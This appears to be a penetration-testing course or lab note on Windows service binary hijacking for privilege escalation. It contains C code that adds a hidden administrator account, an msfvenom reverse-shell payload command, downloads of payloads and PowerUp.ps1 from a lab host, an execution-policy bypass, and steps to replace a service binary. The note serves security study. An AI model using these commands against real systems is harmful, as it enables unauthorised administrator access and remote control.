# Service Binary Hijacking

### <mark style="background-color:purple;">List installed Windows Services</mark>

{% code overflow="wrap" %}
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
{% endcode %}

* `Get-CimInstance` - query the WMI class _win32\_service_
* interested in the name, state, and path of the binaries for each service and therefore, use `Select` with the arguments `Name`_,_ `State`, and `PathName`.
* filter out any services that are not in a Running state by using `Where-Object`

_**Binary installation locations:**_

* `C:\Windows\System32` -
* `C:\xampp\` - binaries in this directory are user-installed and software developer is in charge of dir and permissions of software
  * make it potentially prone to service binary hijacking

### <mark style="background-color:purple;">Enumerate permissions on service binaries</mark>

```powershell
icacls "C:\xampp\apache\bin\httpd.exe"
```

| Mask | Permissions             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |

> Users group have the Full Access (F) permission, allowing us to write to and modify the binary and therefore, replace it.\
> must have a missing indicator (I) preceding the permission

### <mark style="background-color:purple;">Exploit Service Binaries</mark>&#x20;

**add a new user (adduser.c)**

{% code title="adduser.c" %}
```cpp
#include <stdlib.h>

int main () 
{ 
	int i;
	i = system ("net user dave2 password123! /add"); 
	i = system ("net localgroup administrators dave2 /add"); 
	return 0; 
}
prepare adduser.c:
```
{% endcode %}

`x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`

**create a reverse shell payload**

{% code overflow="wrap" %}
```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o BackupMonitor.exe
```
{% endcode %}

<mark style="background-color:blue;">**Add exploit to Windows machine**</mark>

* <mark style="color:blue;">Download exploit from python3 webserver</mark>
* <mark style="color:blue;">move the original binary into home directory</mark>
* <mark style="color:blue;">move exploit into binary dir</mark>

{% code overflow="wrap" lineNumbers="true" %}
```powershell
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```
{% endcode %}

_**Restart binary**_

`whoami /priv` - get list of all current user privs

* **SeShutdowPrivilege** is needed to be listed to be able to do the reboot

`net stop mysql` - stop the service

`Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}` - manually restart the service

`shutdown /r /t 0` - issue a reboot (r) in 0 seconds (/t 0)



`Get-LocalGroupMember administrators` - check if privesc worked

### <mark style="background-color:yellow;">PowerUp.ps1</mark>

automated tool to detect the priv esc vector

```powershell
PS C:\Users\dave> iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1 
PS C:\Users\dave> powershell -ep bypass 
... 
PS C:\Users\dave> . .\PowerUp.ps1 
PS C:\Users\dave> Get-ModifiableServiceFile
```

_powershell -ep bypass_ - start powershell with ExecutionPolicy Bypass. Otherwise, it won’t be possible to run scripts as they are blocked.

_Get-ModifiableServiceFile_ - displays the services the current user can modify, such as the service binary or config files

### Lab

***

```powershell
ServiceName : BackupMonitor 
Path : C:\BackupMonitor\BackupMonitor.exe 
ModifiableFile : C:\BackupMonitor\BackupMonitor.exe 
ModifiableFilePermissions : {Delete, WriteAttributes, Synchronize, ReadControl...} ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users 
StartName : .\roy 
AbuseFunction : Install-ServiceBinary -Name 'BackupMonitor' 
CanRestart : True 
Name : BackupMonitor
```

* **Modifiable Binary Path**: The service binary (`C:\BackupMonitor\BackupMonitor.exe`) was writable by `NT AUTHORITY\Authenticated Users`.
* **Service User Context**: The service runs as `.\roy`, a different (potentially more privileged) user.
* **Restart Capability**: The `CanRestart` property was `True`, allowing you to restart the service and execute the replaced binary.
* **Executable Path Exists**: The `Path` points to a valid and modifiable executable (`BackupMonitor.exe`), making it exploitable.
* **Permission Details**: Permissions such as `Delete`, `WriteAttributes`, and `Synchronize` on the binary allowed full control for payload replacement.

**BackupMonitor** was chosen because it had:

* A specific, writable binary (`C:\BackupMonitor\BackupMonitor.exe`).
* Restart capability (`CanRestart = True`).
* A different user context (`.\roy`).

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o BackupMonitor.exe` - create a reverse shell payload

\[PS]

`Get-Service -Name BackupMonitor` - verify status of the service BackupMonitor

`Start-Service -Name BackupMonitor` - starts the service BackupMonitor
